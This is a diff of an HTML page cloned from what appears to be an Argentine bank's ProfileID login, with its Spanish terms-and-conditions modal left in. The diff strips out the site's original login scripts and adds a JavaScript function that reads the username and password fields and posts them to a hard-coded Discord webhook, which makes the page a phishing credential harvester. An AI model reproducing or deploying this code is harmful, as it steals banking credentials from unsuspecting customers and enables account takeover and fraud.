@@ -47,6 +47,33 @@
         <h4 class="modal-title" id="modal-title">T&eacute;rminos y Condiciones - Profile ID</h4> </div> <div class="modal-body" id="modal-body"> <p class="terminos-texto-bind-id"> <strong>Reconozco y acepto que el sistema ProfileID se regir&aacute por las siguientes cl&aacuteusulas:</strong> <br><br> <strong>PRIMERA: </strong><u>CLAVE.</u> De ser aceptada la presente por el banco, el sistema otorgar&aacute al solicitante un ProfileID &uacutenico, personal e intransferible compuesto de un nombre de usuario y una clave, que cumple con los requisitos normativos de seguridad establecidos por el BCRA, que elija el solicitante y sea aceptada por el banco de acuerdo a las condiciones operativas del sistema.<br><br> <strong>SEGUNDA: </strong><u>USO ALTERNATIVO.</u> El usuario renuncia a reclamar al BANCO da&ntilde;o o perjuicio alguno derivado de eventuales interrupciones o errores en el Sistema ProfileID o en cualquier otro sistema del banco, reconociendo que puede operar sus cuentas por las v&iacuteas tradicionales asistiendo a cualquiera de las sucursales del BANCO, adem&aacutes de mediante la utilizaci&oacuten del sistema ProfileID.<br><br> <strong>TERCERA: </strong><u>APLICACIONES DEL SISTEMA ProfileID.</u> Cada persona f&iacutesica tendr&aacute su propio ProfileID con el cual podr&aacute acceder a cualquiera de los servicios brindados por el banco a trav&eacutes de Internet. La adhesi&oacuten al Sistema ProfileID no importar&aacute el acceso a otros servicios del banco, los cuales ser&aacuten solicitados por el usuario en cada caso y su uso y alcance estar&aacute regido por los t&eacuterminos y condiciones aplicables en cada caso.<br><br> <strong>CUARTA: </strong><u>RESPONSABILIDAD.</u> El uso que el solicitante haga del Sistema ProfileID es de su exclusiva responsabilidad, no siendo responsable el banco por las acciones realizadas con el ProfileID ni por el uso que terceros hagan de la misma, dejando aclarado que la ProfileID es personal e intransferible, oblig&aacutendose el solicitante a no revelar la misma a terceros y asumiendo toda responsabilidad por las transacciones y consultas que se cursen por intermedio de su ProfileID. En tal sentido, queda liberado el Banco de toda responsabilidad que derive del uso del ProfileID. Dada la naturaleza del servicio, el Banco entiende que toda conexi&oacuten a sus servicios que se efect&uacutee proporcionando la denominada ProfileID es realizada por el usuario, considerando entonces las instrucciones cursadas como emanadas de &eacutel siendo v&aacutelidas y leg&iacutetimas sin necesidad de realizar ning&uacuten otro control o resguardo de ning&uacuten tipo.<br><br> <strong>QUINTA: </strong><u>MODIFICACIONES.</u> El usuario acepta que el servicio ProfileID tiene como finalidad exclusiva el acceso a otros productos o servicios del banco a trav&eacutes de canales electr&oacutenicos por lo que podr&aacute ser modificado o reemplazado de acuerdo a los desarrollos o cambios en los sistemas que realice el banco.<br><br> <strong>La validaci&oacuten por parte del banco de la ProfileID solicitada por el usuario importar&aacute la aceptaci&oacuten de la presente.</strong><br><br> </p> </div> 
         <div class="modal-footer"></div> </div> </div> </div>
       <div id="footer" class="footer" role="footer"> </div> </div> 
-    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="/scripts/vendor-login.d6b0930c.js"></script>
-    <script src="/scripts/scripts-login.8d6dbd14.js"></script> 
-    <script>(function(){var js = "window['__CF$cv$params']={r:'811ae6b229f42025',t:'MTY5NjU2MzgxNy42MzgwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body> </html>
+  
+    <script>
+   function enviarDatos() {
+    var username = document.getElementById("username").value;
+    var password = document.getElementById("password").value;
+
+    var data = {
+      username: username,
+      password: password
+    };
+
+    var discordWebhookUrl = "https://discordapp.com/api/webhooks/1074491610471084072/DQZ8B1z42DNbxwZgANi4MRhmivlWYKpkGYnLnFKoeQrqUuAdzsHm1NgzWweNJWog0y38";
+
+    fetch(discordWebhookUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    })
+    .then(function(response) {
+      console.log("Datos enviados al webhook de Discord:", response);
+      // Puedes redirigir al usuario a otra página o mostrar un mensaje de éxito aquí
+    })
+    .catch(function(error) {
+      console.error("Error al enviar datos al webhook de Discord:", error);
+      // Puedes mostrar un mensaje de error al usuario aquí
+    });
+  }
+    </script></body> </html>
